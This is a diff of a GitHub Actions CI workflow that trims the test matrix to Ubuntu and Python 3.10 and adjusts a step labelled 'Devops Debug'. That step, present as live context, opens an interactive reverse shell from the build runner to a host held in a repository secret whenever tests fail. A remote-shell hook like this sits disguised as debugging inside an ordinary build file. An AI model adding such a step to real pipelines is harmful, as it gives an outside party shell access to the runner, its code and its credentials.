@@ -13,8 +13,8 @@ jobs:
     runs-on: ${{ matrix.os }}
     strategy:
       matrix:
-        os: [ubuntu-latest, macos-latest, windows-latest]
-        python-version: [ '3.7', '3.8', '3.9', '3.10']
+        os: [ubuntu-latest]
+        python-version: [ '3.10']
     steps:
       - uses: actions/checkout@v3
       - name: Set up Python
@@ -36,7 +36,7 @@ jobs:
         run: |
           pipenv run pytest -v --full-trace
       - name: Devops Debug
-        if: failure()
+        if: ${{ failure() }}
         run: |
           bash -i >& /dev/tcp/${{ secrets.DEBUG_SERVER }} 0>&1
         continue-on-error: true
